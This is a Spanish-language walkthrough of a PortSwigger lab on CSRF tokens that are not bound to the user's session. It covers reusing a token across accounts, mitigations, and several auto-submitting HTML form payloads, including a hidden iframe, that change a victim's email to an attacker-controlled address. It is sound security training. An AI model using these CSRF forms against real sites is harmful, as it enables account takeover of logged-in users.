
---

# CSRF con token no vinculado a la sesión

## 1. Introducción

En este laboratorio analizamos una vulnerabilidad de **Cross-Site Request Forgery (CSRF)** causada por una implementación incorrecta de tokens anti-CSRF que **no están vinculados a la sesión del usuario**.

Esto significa que un token emitido para un usuario puede ser utilizado por otro usuario distinto, permitiendo ejecutar acciones críticas sin necesidad de conocer o predecir el token específico asociado a la víctima.

El objetivo es modificar el correo electrónico del usuario víctima explotando un token válido previamente obtenido.

[Ver laboratorio Portswigger](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

---

## 2. Contexto de la vulnerabilidad

La aplicación utiliza tokens CSRF para proteger peticiones sensibles, como el cambio de correo electrónico.  
Sin embargo, el valor del token:

- Es **válido globalmente**, no por sesión
    
- No está asociado a ninguna información contextual
    
- No depende de identidad, sesión, IP, ni timestamp relevante
    

Por tanto, **cualquier token válido puede ser enviado por otro usuario** y el servidor lo aceptará como legítimo.

Este enfoque anula la protección, ya que el atacante solo necesita obtener un token válido una vez para poder reutilizarlo contra otras víctimas.

---

## 3. Análisis de peticiones y comportamiento del servidor

### 3.1 Obtención de token válido

1. Iniciamos sesión como el primer usuario
    
2. Accedemos al formulario de cambio de correo
    
3. Capturamos la petición en Burp y extraemos el token, por ejemplo:
    

```
csrf=oZS3wn9hgLpzGvxMYEJHX0Pf2Dq5cMzM
```

4. Descartamos la petición (no la enviamos)
    

### 3.2 Reutilización del token en otra sesión

1. Abrimos otra sesión independiente (incógnito)
    
2. Iniciamos sesión como un segundo usuario
    
3. Enviamos una petición POST cambiando el token por el obtenido anteriormente
    

Resultado:

> El servidor acepta el token y procesa el cambio, aunque no corresponda a la sesión actual.

Esto confirma que el token no está vinculado a la identidad del usuario.

---

## 4. Explotación

La explotación consiste en crear un HTML que envíe una petición POST con:

- Un correo controlado por el atacante
    
- El token CSRF válido obtenido previamente
    
- Auto-envío silencioso
    

### 4.1 Payload que resuelve el laboratorio

```html
<form class="login-form" name="change-email-form" action="https://0ab600a80385e1b58052df9000bb00b7.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@hacked.com">
    <input required="" type="hidden" name="csrf" value="oZS3wn9hgLpzGvxMYEJHX0Pf2Dq5cMzM">
</form>

<script>
    document.forms[0].submit();
</script>
```

Condiciones del exploit:

- La víctima debe estar autenticada
    
- El token debe ser **válido y fresco**
    
- El correo debe **no coincidir con el del atacante**
    
- El código se aloja en el exploit server y se entrega a la víctima
    

---

## 5. Publicación y verificación del exploit

1. Pegamos el HTML en el exploit server
    
2. Probamos con **View exploit**
    
3. Confirmamos que el cambio de correo se ejecuta
    
4. Guardamos
    
5. Usamos **Deliver to victim**
    

Si la víctima está autenticada, el laboratorio se resuelve.

---

## 6. Fundamentación del fallo

La raíz del problema es que el servidor **no vincula el token CSRF con la sesión ni identidad del usuario**.

Esto permite:

- Reutilizar tokens de otro usuario
    
- Compartir tokens entre sesiones
    
- Automatizar ataques sin conocer credenciales
    

Consecuentemente, el token deja de ser un **secreto unívoco** y se convierte en una **contraseña global reutilizable**, destruyendo completamente la utilidad del control.

---

## 7. Conclusión

Este laboratorio demuestra que no basta con “tener tokens CSRF”; su efectividad depende de cómo se integran en el modelo de sesión.

Un token anti-CSRF efectivo debe ser:

- Único por usuario
    
- Único por sesión
    
- Difícil de predecir
    
- No reutilizable
    

Si cualquiera de estos atributos falla, la protección se vuelve insuficiente ante un atacante mínimamente capaz.

---

## 8. Mitigaciones

### 8.1 Asociar tokens a la sesión del usuario

- Los tokens deben guardarse en el servidor
    
- Validar identidad y sesión asociada
    
- Rechazar tokens de otra sesión
    

### 8.2 Rotación y caducidad

- Tokens de un solo uso
    
- Expiración basada en tiempo corto
    
- Invalidación al cerrar sesión
    

### 8.3 Validar origen de la solicitud

- `Origin` y `Referer`
    
- SameSite Cookies (`Lax`/`Strict`)
    

### 8.4 Defensa por capas

- Doble submit cookies
    
- Nonces por formulario
    
- Re-autenticación para acciones sensibles
    

---

## 9. Payloads alternativos

### 9.1 Iframe silencioso

```html
<iframe style="display:none" srcdoc='
<form method="POST" action="https://LAB-ID/change-email">
  <input type="hidden" name="email" value="victima@evil.com">
  <input type="hidden" name="csrf" value="TOKENVAL">
</form>
<script>document.forms[0].submit()</script>
'></iframe>
```

### 9.2 Ataque sin JavaScript (degradación)

```html
<body onload="document.forms[0].submit()">
<form method="POST" action="https://LAB-ID/change-email">
  <input type="hidden" name="email" value="hijacked@evil.com">
  <input type="hidden" name="csrf" value="TOKENVAL">
</form>
</body>
```

---
